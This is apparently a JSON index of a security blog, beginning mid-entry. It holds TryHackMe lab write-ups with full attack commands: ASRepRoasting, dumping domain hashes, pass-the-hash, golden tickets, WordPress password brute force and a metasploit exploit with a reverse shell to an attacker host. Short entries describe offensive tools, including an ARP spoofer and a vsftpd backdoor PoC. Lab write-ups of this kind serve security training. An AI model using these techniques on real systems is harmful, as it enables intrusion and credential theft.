    "content": "IntroductionHello everyone, today we’ll be taking a look at Attacktive Directory, a Medium guided room on TryHackMe. We’ll explore the exploitation of a vulnerable Domain Controller via ASRepRoasting with impacket, and as a bonus we’ll cover the generation of Golden Tickets. Let’s get started.  Enumeration          Portscan      SMB (139,445)      Enumerating users        Exploitation          ASRepRoasting      Re-Enumerating SMB        Privesc          Secretsdump      Getting flags        Bonus          Generating Golden Tickets      EnumerationPortscanIt’s not asked but let’s start with a port scan. As always, I use rustscan and specify the nmap options with the -- NMAP_OPTIONS syntax. In this case, we’re scanning for service versions and outputting the result to a file named all_ports.txt.rustscan -a $TARGET_IP -- -sV -oN all_ports.txtPORT      STATE SERVICE       REASON  VERSION53/tcp    open  domain        syn-ack Simple DNS Plus80/tcp    open  http          syn-ack Microsoft IIS httpd 10.088/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-12-29 12:52:00Z)135/tcp   open  msrpc         syn-ack Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack464/tcp   open  kpasswd5?     syn-ack593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped    syn-ack5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp  open  mc-nmf        syn-ack .NET Message Framing------- a few MSRPC ports used internally, not relevant What do we learn from this portscan ?  The target is likely a Domain Controller  The target is part of a domain named spookysec.local  There are ton of services runningSMB (139, 445)Since it’s a guided room, we don’t have to explore all the services. Let’s map the domain spookysec.local to the the DC’s IP:echo \"$TARGET_IP spookysec.local\" &gt;&gt; /etc/hostsNext let’s enumerate smb with the enum4linux tool. Here is the output where I removed the irrelevant parts:┌──(kali㉿kali)-[~/Chall/THM/Attacktivedirectory/Enum]└─$ enum4linux $TARGET_IP[+] Server 10.10.60.35 allows sessions using username '', password ''Domain Name: THM-ADDomain Sid: S-1-5-21-3591857110-2884097990-301047963\tSharename       Type      Comment\t---------       ----      -------Reconnecting with SMB1 for workgroup listing.Unable to connect with SMB1 -- no workgroup availableS-1-5-21-3591857110-2884097990-301047963-500 THM-AD\\Administrator (Local User)S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\\Guest (Local User)S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\\krbtgt (Local User)We get the NetBIOS-Domain name and some users that we could try to Kerberoast / ASRepRoast … More on that later.Answering questions  What tool will allow us to enumerate port 139/445?enum4linux is a well-known tool that allows you to enumerate information from Windows and Samba systems.  What is the NetBIOS-Domain Name of the machine?THM-AD  What invalid TLD do people commonly use for their Active Directory Domain?Earlier, we saw in the portscan that the FQDN  was spookysec.local. The TLD (Top Level Domain) is basically the “extension”, in our case it’s .local.Enumerating usersWe are asked to use kerbrute with this username wordlist to bruteforce users from the Active Directory by attacking Kerberos, so let’s do that:kerbrute usernum --dc \"$TARGET_IP\" -d \"$DOMAIN_NAME\" \"$WORDLIST\"Kerbrute found a few AD usersI will put thoses usernames in a file before continuing:AdministratorGuestDefaultAccountWDAGUtilityAccountjamessvc-adminrobindarkstarbackupparadoxAnswering questions  What command within Kerbrute will allow us to enumerate valid usernames?userenum.  What notable account is discovered? (These should jump out at you)svc-admin (for service admin) seems interesting.  What is the other notable account is discovered? (These should jump out at you)backup could also potentially be interesting.ExploitationASRepRoasting  Impacket has a tool called “GetNPUsers.py” that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.You can learn more about ASRepRoasting here. Basically, we query the Key Distribution Center (KDC) for TGTs (Ticket Granting Tickets) as other users. If the user is vulnerable to ASRepRoasting, the KDC will send us a TGT that we’ll attempt to crack to obtain the user’s passwordLet’s use the GetNPUsers script from Impacket to search for ASRepRoastable users and ask the KDC for TGTs as those users. You can learn more about this script here.impacket-GetNPUsers -dc-ip $TARGET_IP \"$DOMAIN_NAME/\" -usersfile $USERS_FOUND_WITH_KERBRUTEsvc-admin is ASRepRoastableAnd use john to crack this kerberos AS-REP:$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:542ffcaff5ff973571221ce247639de5$5c015375d1747520c65cfd0e274742646078ed1bbc30bf1e9dd63fa32be9d663e62ec8271864c9ba8fa7a299f3802b2faff8dfd6d1684682eb82d8a22b6da935f890fa490ba3767331584e16c4622407ab473e2c190a22a470e9fed5750a49234d0099b44f9e0f180c96e492d614bc137226a8f872c4c731a6ab03ef88ced8014c32e180d8b7afcd404602d8bad7a6bcda4b97107aef337ab9192ffcc7c23a6f8b6f9101cc006d39c2188c1aa4fc31d87bde8737465ee6d31a13d36538b9381143d295a158a6602792d48fbf4119028f9ca7b233def4de701fa339d8eb332ec9fcb9c4b6662710a72bf35601d0b7d79c7aaaBingo !Answering questions  We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?svc-admin  Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)Kerberos 5 AS-REP etype 23, as seen from the John output.  Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)18200 found using hashcat --help | grep -i kerberos  Now crack the hash with the modified password list provided, what is the user accounts password?management2005Re-Enumerating SMB  With a user’s account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.smbclient -L \"//10.10.60.35/\" -U \"svc-admin%management2005\"We have access to 6 shares nowWhat do we learn from the smbclient output ?            Share name      Description      Default share ?                  ADMIN$      Provide remote access to the system root      Yes              backup             No              IPC$      Inter-Process Communication      Yes              NETLOGON      Store and distribute logon scripts, policies etc      Yes              SYSVOL      Store and replicate domain-wide files like GPO, GPP …      Yes      Enumerating non-defaults shares first is often a good idea:smbclient \"//10.10.60.35/backup\" -U \"svc-admin%management2005\"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYwLooks like base64, let’s decode it from the terminal:┌──(kali㉿kali)-[~/Chall/THM/Attacktivedirectory/Exploit]└─$ cat backup_credentials.txt | base64 -dbackup@spookysec.local:backup2517860   And we retrieve the backup credentials.Answering questions  What utility can we use to map remote SMB shares?smbclient is a straightforward tool that we can use for this task  Which option will list shares?-L, found by reading the help menu  How many remote shares is the server listing?6  There is one particular share that we have access to that contains a text file. Which share is it?backup  What is the content of the file?YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw  Decoding the contents of the file, what is the full contents?backup@spookysec.local:backup2517860PrivescSecretsdump  The backup account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes.Interesting ! That means that we can probably dump Domain Credentials using a tool like secretsdump:impacket-secretsdump -just-dc \"$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP\"And we get all the NTLM hashesAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::We can authenticate with the Administrator hash without having to crack it (using pass-the-hash), and with krbtgt hash, we can create Golden Tickets (more on that later).Answering questions  What method allowed us to dump NTDS.DIT?DRSUAPI  What is the Administrators NTLM hash?The hashes are in the format LM:NT, so the response is 0e0363213e37b94221497260b0bcb4fc  What method of attack could allow us to authenticate as the user without the password?Pass The Hash  What method of attack could allow us to authenticate as the user without the password?-HGetting flagsThere are several tools that supports pass-the-hash and that could allow us to get an Administrator shell on the Domain Controller:  impacket-psexec  impacket-smbexec  impacket-wmiexec  evil-winrmLet’s go with evil-winrm:evil-winrm -i \"$TARGET\" -u \"$USERNAME\" -H \"$NT_HASH\" We succesfully used the pass-the-hash method to authenticate as adminAnd we can display grab the 3 flagsBonusGenerating Golden TicketsI always forget the commands so this section serves like a memo. You can learn more about silver and golden tickets here.Let’s start by getting the Domain SID. From evil-winrm, we type:*Evil-WinRM* PS C:\\&gt; (Get-ADDomain).DomainSID.Value S-1-5-21-3591857110-2884097990-301047963We already have the NT hash of the krbtgt account, which is:0e2eb8158c27bed09861033026be4c21We can generate our Golden Tickets using impacket-ticketer:impacket-ticketer -nthash $KRBTGT_NT_HASH \\            -dc-ip $DC_IP \\            -domain-sid $DOMAIN_SID \\            -domain $DOMAIN_NAME \\            $USERNAMEWe’ve succesfully generated a Golden TicketNext we need to export a variable that will store the path to the generated Golden Ticketexport KRB5CCNAME=\"$(pwd)/$USERNAME.cache\"Finally, we can use whatever script for the impacket suite that we want, using the -k -no-pass options to specify that we want to authenticate using the kerberos ticket:We are connected as admin without having to authenticate"
  },
  
  {
    "title": "Blog",
    "url": "/posts/thm-blog/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, web, wordpress, smb, wpscan, metasploit, pwncat, linux-privesc",
    "date": "2024-12-28 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Blog, a Medium rated room on TryHackMe. We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, ...",
    "content": "IntroductionHello everyone, today we will be taking a look at Blog, a Medium rated room on TryHackMe. We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, before moving on to the privilege escalation phase using tools like pwncat, LinPEAS and ltrace. Let’s get started !  Enumeration          Portscan      SMB (139,445)      HTTP (80)                  Manual enumeration          Wpscan                    Searchsploit        Exploitation          Testing searchsploit exploit      Bruteforcing WordPress      Getting RCE        Privesc          Pwncat      User flag … or not      Manual enumeration      Linpeas      SUID Binary      EnumerationPortscanFirst the room asks us to map the blog.thm domain name to the $TARGET_IP in /etc/hosts, so I started by doing that.As always, I like to begin with a port scan. For this I use rustscan. It’s basically a Rust-based port scanner that detects open ports, and then launches an nmap scan only on the discovered ports. You can specify options to the subsequent nmap scan by using the -- NMAP_OPTIONS syntax. I like to go with -sV for identification of services version, and -oN ports to save the result to a file named all_ports.txt.rustscan -a $TARGET_IP -- -sV -oN all_ports.txtPORT    STATE SERVICE     REASON  VERSION22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelWhat do we learn from this portscan ?  The target is a Linux system  SSH, HTTP and SMB are runningSMB (139, 445)I always start by enumerating SMB because it’s relatively quick and we often find juicy files. So I started with an smbclient:┌──(kali㉿kali)-[~]└─$ smbclient -L \"//$TARGET_IP\" -U \"%\"\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\tBillySMB        Disk      Billy's local SMB Share\tIPC$            IPC       IPC Service (blog server (Samba, Ubuntu))When using smbclient, you can specify a username and a password with the following syntax: -U \"username%password\". So -U \"%\" essentially means blank username, blank password.            Share name      Description      Default share ?                  ADMIN$      Store printer drivers and related files      Yes              BillySMB             No              IPC$      Inter-Process Communication      Yes      Let’s explore BillySMB:┌──(kali㉿kali)-[~]└─$ smbclient \"//$TARGET_IP/BillySMB\" -U \"%\"`Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Tue May 26 20:17:05 2020  ..                                  D        0  Tue May 26 19:58:23 2020  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020  check-this.png                      N     3082  Tue May 26 20:13:43 2020\t\t15413192 blocks of size 1024. 9788764 blocks availablesmb: \\&gt; mget *Open thunar to get a general overview:SMB filesAlice-White-Rabbit.jpg is a JPG file, so I want to try some steganography tricks with an empty passphrase:┌──(kali㉿kali)-[~]└─$ steghide extract -sf Alice-White-Rabbit.jpgEnter passphrase: wrote extracted data to \"rabbit_hole.txt\"┌──(kali㉿kali)-[~]└─$ cat rabbit_hole.txtYou ve found yourself in a rabbit hole, friend.check-this.png  appears to be a QR code, so let’s scan it using zbarimg:┌──(kali㉿kali)-[~]└─$ zbarimg check-this.png QR-Code:https://qrgo.page.link/M6dEscanned 1 barcode symbols from 1 images in 0 secondsWe could enumerate further, using tools like exiftool and binwalk, tryna look at the .mp4 file and so on, but seems like this SMB server is just a rabbit hole. I also ran enum4linux to double check, but nothing interesting came up. Let’s move on.HTTP (80)You can learn more about WordPress enumeration in here.Seems like WordPress is runningManual enumerationAs you can see on the index page, the post has been written by Karen WheelerThere is a little trick that you can use to enumerate other users. Simply add ?author=X where X is a number at the end of the URL:I tried it with X=2 but it returned a 404 Not Found, so there are only two users on this WordPress website.Let’s try to login manually. Note that we cannot login with Karen Wheeler or Billy Joel as username, we need to login with their wordpress generated usernames, the first letter of the firstname and the lastname:        WpscanHere is the wpscan with irrelevant parts removed:┌──(kali㉿kali)-[~]└─$ wpscan --url http://$TARGET_IP[+] robots.txt found: http://10.10.132.87/robots.txt | Interesting Entries: |  - /wp-admin/ |  - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://10.10.132.87/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) |  - http://10.10.132.87/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.0' | Confirmed By: Meta Generator (Passive Detection) |  - http://10.10.132.87/, Match: 'WordPress 5.0'[i] No plugins Found.I checked the /wp-content/uploads/ folder since it has directory listing enabled, but found nothing interesting there. Version is 5.0 which is quite old, so let’s search for potential exploits.SearchsploitWordpress 5.0 is an old version (the latest version is 6.7), so running searchsploit against this version might be a good ideaSearchsploit found a lot of exploits that match this WP versionThere are a ton of exploits, but only 5 of them affect WordPress itself and only 4 are of interest (the fifth is a DoS exploit).The others exploits target WP plugins, but we know from the wpscan that there are no plugins installed here. So we only need to test 4 exploits.The relevant exploitsWe have gathered enough information from the enumeration phase. Let’s move on to the exploitation part.ExploitationTesting searchsploit exploits            Exploit name      Problem                  php/webapps/49512.py      Authenticated              php/webapps/46511.js      Authenticated              php/remote/46662.rb      Authenticated              multiple/webapps/47690.md      Didn’t work      Bruteforcing WordPressSince all exploits are authenticated and we don’t have credentials, let’s try a dictionary attack with wpscan. First we will create the user wordlist, then launch the attack:┌──(kali㉿kali)-[~]└─$ echo -e \"bjoel\\nkwheel\" &gt; real_users.txt┌──(kali㉿kali)-[~]└─$ wpscan --url http://$TARGET_IP/ -U real_users.txt -P $PASSWORD_WORDLISTI started by trying the 2020-200_most_used_passwords.txt and the 2023-200_most_used_passwords.txt wordlists from SecLists but nothing came up. So I decied to be patient, and used the rockyou.txt wordlist. After a few minutes I got this:[+] Performing password attack on Xmlrpc against 2 user/s[SUCCESS] - kwheel / cutiepie1^C[!] Valid Combinations Found: | Username: kwheel, Password: cutiepie1 Getting RCEWe finally have our needed credentials: kwheel:cutiepie1. Let’s use the metasploit authenticated exploit that we found earlier.┌──(kali㉿kali)-[~]└─$ msfconsolemsf6 &gt; use exploit/multi/http/wp_crop_rceAfter typing show options, we notice that some parameters need to be configured.msf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set USERNAME kwheelmsf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set PASSWORD cutiepie1msf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set RHOSTS $TARGET_IPmsf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set LHOST $ATTACKER_IPWithin a few seconds, we’re greeted with a meterpreter session.PrivescPwncatThe meterpreter is cool but I prefer to use pwncat. So I setup the pwncat reverse listener in another terminal, and run a reverse shell from the meterpreter session like this:From meterpreter to pwncatUser flag … or notI tried to cat the user flag, but I got trolled:(remote) www-data@blog:/var/www/wordpress$ cat /home/bjoel/user.txtYou won't find what you're lookif for here.TRY HARDERLooking into the bjoel home directory, I came across a PDF. Downloaded it using pwncat and opened it:Joel was working for Rubber DuckyThis might be a clue, perhaps the flag is in /media/ or something:Not a big deal, we’ll search for the user flag once we have root access.Manual enumerationLet’s start by enumerating the users that have a connection shell(remote) www-data@blog:/var/www/wordpress$ cat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashbjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bashNext, let’s grab the content of the wp-config.php file. This file contains information required by WordPress to connect to the database such as:  db name  db host  db username  db password(remote) www-data@blog:/var/www/wordpress$ cat wp-config.php | grep DB_define('DB_NAME', 'blog');define('DB_USER', 'wordpressuser');define('DB_PASSWORD', 'LittleYellowLamp90!@');Tried using the database password to su bjoel and su root, but unfortunately it didn’t work. Next, I extracted the password for the bjoel WordPress user from the MySQL database and I attempted to crack it with john, but … my CPU ain’t powerful enough. Time for automated enumeration I guess.LinpeasNote: with pwncat, you can switch between the attacker’s shell and the victim’s shell by pressing Ctrl + D.Look at the last lineIt looks like there is an unknown SUID binary ! SUID (Set User ID) is a special permission with one key function: the binary executes as the user who owns the file. This means that if the binary is owned by root, it will execute with root privileges, even if launched by the www-data user. Therefore, it’s a significant privesc vector. More on that here.SUID binaryWhen we run the binary, it says “Not an Admin”. Let’s download it locally and try to ltrace it to examine dynamic libraries and syscall done by the binary:Downloading it with the help of pwncatAnalyzing it with ltraceFrom the ltrace output, we see that the binary checks the admin variable from the environment with the getenv() function. So we can just modify the admin env variable and set it to true. Once we do that we can grab our flags !Rooted !We use the find command to search for the real user.txt flag, which was indeed located in the /media/usb/, just as we suspected ."
  },
  
  {
    "title": "wpsh",
    "url": "/posts/wpsh/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-12-25 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. ...",
    "content": "🚀 UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. Once authenticated, the script establishes a reverse shell, granting access to the remote instance.wpsh help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "arpspoofer",
    "url": "/posts/arpspoofer/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-11-28 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect netwo...",
    "content": "🚀 UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect network traffic through the attacker, enabling interception or modification of data.  In the help menu, you can see -g GATEWAY and -t TARGET. However, if you want to capture traffic between two victims without one of them being the gateway, you can still use this tool with -g TARGET1 and -t TARGET2.arpspoofer help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "Todo.js",
    "url": "/posts/todojs/",
    "categories": "Web Dev, React",
    "tags": "",
    "date": "2024-07-04 16:00:00 +0000",
    





    
    "snippet": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more...",
    "content": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more. Tasks are stored in localStorage, ensuring that all modifications are persisted. Finally, the frontend is built using Tailwind.          SourceThe source code and installation instructions are accessible here.You can also test it directly in here."
  },
  
  {
    "title": "FTPy",
    "url": "/posts/ftpy/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2023-05-11 16:00:00 +0000",
    





    
    "snippet": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewComm...",
    "content": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewCommandsAuth  USER  PASSInteraction with files  PASV  LIST (ls)  RETR (get)  STOR (put)Interaction with filesystem  CD (cd)  PWD (pwd)  MKD (mkdir)  DELE (rm)  CHMOD (chmod)SourceThe source code and installation instructions are accessible here"
  },
  
  {
    "title": "Laravel Cybershop",
    "url": "/posts/laravel-ecommerce/",
    "categories": "Web Dev, Laravel",
    "tags": "",
    "date": "2023-04-23 16:00:00 +0000",
    





    
    "snippet": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, s...",
    "content": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, some library like HTMX and Swiper, and Bootstrap for the front end part. I also used the Pusher websocket to create real-time notifications.General overviewThe products are sorted by categories. Each category has its own search bar, and there is a general search bar that searches across all categories. On the product display pages, you can see the products, their names, categories, prices, and average rating.          LoginYou can create an account with whatever email address you want, but you’ll need to validate it by clicking on the link sent by email. You can reset your password using the same email address.          As you can see, livewire is used for the dynamic validation here.ProductYou can sell a product by adding it in the “market” section. Give it a name, a price, a category, and a main image. You can also add secondary images. Finally, a MD-like editor is available for the product description (bold, italic, list, strikethrough text, links and so on).The drag &amp; drop functionnality is done with filepond.js.          CommentsYou can leave a comment on any product by adding a title, a rating, and your comment. Again, a markdown-like editor is available to help you style your text. Finally, you can “heart” other people’s comments.          SettingsYou can customize your profile by changing your profile picture, email, or password. There is also a profile page displaying the products you are selling, the number of hearts your comments have received, your average product rating, the number of comments you have made, and a list of your recent comments.          PaymentWhen you add a product to your cart, it appears in the small dynamic cart icon in the navbar. Clicking on this cart icon takes you to a more detailed page where you also have the option to buy by making the payment (we have chosen to use Stripe).          I chose Livewire for the dynamic cart page.ChatboxThere is a chat that allows you to interact with sellers or other clients. It is dynamic and supports sending messages as well as images. Additionally, the notification component in the navbar uses WebSockets, making it real-time. Therefore, you will receive notifications instantly as they happen.          The dynamic notification component is updated using livewire + pusher.js websocket.SourceThe source code and installation instructions are accessible here.You’ll also find a docker-compose file there if you want to test the application locally."
  },
  
  {
    "title": "PHP Chat",
    "url": "/posts/php-webchat/",
    "categories": "Web Dev, PHP",
    "tags": "",
    "date": "2023-02-16 16:00:00 +0000",
    





    
    "snippet": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentica...",
    "content": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentication and messages, coupled with a MariaDB database.On the other hand, the front-end is entirely handled by JavaScript with AJAX requests, and by Bootstrap + Vanilla CSS for the CSS part.Login          As you may noticed, the validation is done with AJAX, so it’s dynamic.Chat          The &lt;form&gt; is directly posted to the API. However, the update and delete fonctionnalities are done in JavaScript with AJAX requests.Settings page          The validation of the entered password is also done with AJAX requests.SourceThe source code and installation instructions are accessible hereYou’ll also find a docker-compose file there if you want to test the application locally."
  },
  
  {
    "title": "CVE-2011-2523 POC",
    "url": "/posts/cve-2011-2523/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools, poc",
    "date": "2022-06-02 16:00:00 +0000",
    





    
    "snippet": "2022-06-03-vsftpdexploit🚀 UsageThis poc script allows you to exploit the CVE-2011-2523 (VsFTPd 2.3.4 Backdoor Command Execution)POC script help menuSourceThe source code and installation instructio...",
    "content": "2022-06-03-vsftpdexploit🚀 UsageThis poc script allows you to exploit the CVE-2011-2523 (VsFTPd 2.3.4 Backdoor Command Execution)POC script help menuSourceThe source code and installation instructions are accessible here."
  }
  
]

